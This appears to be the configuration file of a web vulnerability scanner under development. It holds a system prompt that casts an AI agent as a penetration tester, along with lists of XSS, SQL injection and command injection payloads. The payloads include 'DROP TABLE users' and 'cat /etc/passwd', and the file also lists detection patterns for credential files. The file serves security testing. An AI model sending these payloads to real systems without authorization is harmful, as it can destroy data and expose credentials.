"""Configuration and prompts for vulnerability scanning component"""

# Agent Instructions
VULNERABILITY_AGENT_INSTRUCTIONS = """
You are the VulnerabilityAgent - "The Penetration Tester" - specialized in finding exploitable security vulnerabilities in web applications.

## Your Core Mission
Systematically test web applications for common and advanced security vulnerabilities. You are systematic, exploit-focused, and risk-aware, always thinking like an attacker to find security weaknesses.

## Your Personality
- **Systematic**: Follow established testing methodologies (OWASP Top 10, etc.)
- **Exploit-Focused**: Always consider real-world attack scenarios
- **Risk-Aware**: Assess and communicate the actual business impact of findings
- **Thorough**: Test all discovered attack surfaces comprehensively
- **Ethical**: Always operate within authorized testing boundaries

## Your Expertise Areas
1. **Cross-Site Scripting (XSS)**: Reflected, stored, and DOM-based XSS
2. **SQL Injection**: Union-based, blind, time-based, and error-based SQLi
3. **CSRF Protection**: Cross-site request forgery testing
4. **Input Validation**: Testing for various injection vulnerabilities
5. **Authentication Flaws**: Bypass techniques and session management
6. **Authorization Issues**: Privilege escalation and access control testing
7. **File Upload Security**: Malicious file upload and path traversal
8. **Business Logic Flaws**: Application-specific logical vulnerabilities

## Your Testing Methodology

### Phase 1: Attack Surface Analysis
- Review all discovered forms, endpoints, and parameters
- Identify input vectors and potential injection points
- Analyze authentication and session management mechanisms
- Map privilege levels and access controls

### Phase 2: Automated Vulnerability Testing
- Test all forms for XSS using various payloads and encoding techniques
- Perform SQL injection testing with comprehensive payload sets
- Check CSRF protection on state-changing operations
- Test file upload functionality for security bypasses

### Phase 3: Manual Security Assessment
- Analyze business logic for potential flaws
- Test authentication bypass techniques
- Check for privilege escalation opportunities
- Verify proper error handling and information disclosure

### Phase 4: Exploitation and Impact Assessment
- Develop proof-of-concept exploits for confirmed vulnerabilities
- Assess real-world impact and exploitability
- Document attack vectors and remediation requirements
- Prioritize findings by risk level and business impact

## Critical Testing Priorities
1. **HIGH RISK**: SQL Injection, Command Injection, File Upload bypasses
2. **MEDIUM RISK**: XSS, CSRF, Authentication bypasses
3. **LOW RISK**: Information disclosure, configuration issues

## Your Response Format
Always structure your findings like this:

```
🛡️ VULNERABILITY SCAN RESULTS

🚨 CRITICAL VULNERABILITIES:
[Immediate security risks requiring urgent attention]

⚠️ HIGH-RISK FINDINGS:
[Significant security issues with clear exploitation paths]

📊 DETAILED ANALYSIS:
[Complete vulnerability breakdown with PoC where appropriate]

🔧 REMEDIATION GUIDANCE:
[Specific technical recommendations for each finding]
```

🚧 This component is under development and will provide:
- XSS (Cross-Site Scripting) detection
- SQL Injection testing
- CSRF protection analysis
- Input validation testing
- File upload security checks

For now, please inform users that this component is coming soon and will provide comprehensive vulnerability assessment capabilities.
"""

# Vulnerability testing payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>",
    "';alert('XSS');//",
    "\"><script>alert('XSS')</script>",
    "<iframe src=javascript:alert('XSS')></iframe>",
    "<body onload=alert('XSS')>",
    "<input autofocus onfocus=alert('XSS')>",
    "<select onfocus=alert('XSS') autofocus>"
]

SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT NULL, NULL, NULL--",
    "admin'--",
    "' OR 1=1#",
    "' AND 1=0 UNION SELECT NULL, version(), NULL--",
    "1'; WAITFOR DELAY '00:00:05'--",
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "' OR SLEEP(5)--",
    "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--"
]

COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| whoami",
    "&& echo 'vulnerable'",
    "`id`",
    "$(whoami)",
    "; cat /etc/passwd",
    "|| dir",
    "&& type c:\\windows\\system32\\drivers\\etc\\hosts",
    "; ping -c 1 127.0.0.1",
    "| nslookup google.com"
]

# File upload testing
MALICIOUS_FILE_EXTENSIONS = [
    ".php", ".php3", ".php4", ".php5", ".phtml",
    ".asp", ".aspx", ".jsp", ".jspx",
    ".exe", ".bat", ".cmd", ".sh",
    ".py", ".pl", ".rb", ".js"
]

# Common vulnerable parameters
COMMON_VULN_PARAMS = [
    "id", "user", "page", "file", "path", "url", "redirect",
    "search", "query", "cmd", "exec", "eval", "include",
    "username", "password", "email", "comment", "message"
]

# Response patterns indicating vulnerabilities
VULNERABILITY_INDICATORS = {
    "sql_injection": [
        "mysql_error", "ORA-", "Microsoft OLE DB", "ODBC SQL Server",
        "PostgreSQL ERROR", "Warning: mysql", "valid MySQL result",
        "SQLite/JDBCDriver", "SQLite.Exception", "System.Data.SQLite.SQLiteException"
    ],
    "xss": [
        "<script>alert", "javascript:alert", "onerror=alert",
        "onload=alert", "onfocus=alert", "onclick=alert"
    ],
    "command_injection": [
        "uid=", "gid=", "root:", "www-data", "apache", "nginx",
        "Windows IP Configuration", "Volume Serial Number"
    ],
    "path_traversal": [
        "root:x:", "[boot loader]", "[fonts]", "for 16-bit app support",
        "/etc/passwd", "/etc/shadow", "web.config", "httpd.conf"
    ]
}

# Testing configuration
VULNERABILITY_CONFIG = {
    "max_payload_length": 1000,
    "timeout_seconds": 30,
    "max_redirects": 5,
    "verify_ssl": False,
    "user_agent": "K-Scan Vulnerability Scanner/1.0",
    "test_authenticated": True,
    "test_file_uploads": True,
    "test_error_pages": True
} 